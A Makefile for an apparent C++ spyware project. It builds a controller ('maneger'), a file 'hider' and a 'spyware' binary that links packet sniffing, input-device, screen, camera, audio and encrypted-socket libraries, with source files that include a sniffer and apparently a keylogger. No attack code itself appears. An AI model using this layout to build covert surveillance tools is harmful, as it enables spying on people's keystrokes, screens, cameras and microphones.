.PHONY: all clean maneger hider spyware

# Compiler
CC = g++

# Compiler flags
CFLAGS = -Wall -Wextra -std=c++17 -I/usr/include/libevdev-1.0/ -I/usr/include/opencv4

MDIR = src/Maneger/
HDIR = src/Hider/
SDIR = src/SpyWare/

# Source files
M_SRCS = src/Maneger/Connection.cpp src/Maneger/HiderManeger.cpp src/Maneger/main.cpp src/Maneger/SoftwareManeger.cpp src/IncludeCPP/encoding.cpp src/Maneger/SocketConnection.cpp src/Maneger/PipeConnection.cpp src/Maneger/BufferConnection.cpp src/IncludeCPP/getBasicInfo.cpp src/Maneger/EncSocketConnection.cpp
H_SRCS = src/Hider/Hider.cpp src/Hider/HiddenFileHandler.cpp src/IncludeCPP/encoding.cpp
S_SRCS = src/Maneger/Connection.cpp src/Maneger/HiderManeger.cpp src/SpyWare/main.cpp src/Maneger/SoftwareManeger.cpp src/IncludeCPP/encoding.cpp src/SpyWare/Contraption.cpp src/SpyWare/ContraptionAdmin.cpp src/SpyWare/Sniffer.cpp  src/Maneger/SocketConnection.cpp src/Maneger/PipeConnection.cpp src/Maneger/BufferConnection.cpp src/IncludeCPP/getBasicInfo.cpp src/SpyWare/kligger.cpp src/Maneger/EncSocketConnection.cpp src/SpyWare/bugg.cpp



# Object files
M_OBJS = $(M_SRCS:.cpp=.o)
H_OBJS = $(H_SRCS:.cpp=.o)
S_OBJS = $(S_SRCS:.cpp=.o)

# Executables names
M_EXEC = maneger
H_EXEC = hider
S_EXEC = spyware

# Rule to compile source files
%.o: %.cpp
	$(CC) $(CFLAGS) -c $< -o $@

all: maneger hider spyware

# Build target
maneger: $(M_EXEC)

$(M_EXEC): $(M_OBJS)
	$(CC) $(CFLAGS) $(M_OBJS) -o $@ -lssl -lcrypto

hider: $(H_EXEC)

$(H_EXEC): $(H_OBJS)
	$(CC) $(CFLAGS) $(H_OBJS) -o $@

spyware: $(S_EXEC)

$(S_EXEC): $(S_OBJS)
	$(CC) $(CFLAGS) $(S_OBJS) -o $@ -ltins -lssl -lcrypto -levdev -lxcb -lopencv_core -lopencv_highgui -lportaudio -lopencv_imgproc -lopencv_imgcodecs -lopencv_videoio


# Clean rule
clean:
	rm -f $(M_OBJS) $(H_OBJS) $(S_OBJS) $(M_EXEC) $(H_EXEC) $(S_EXEC) 
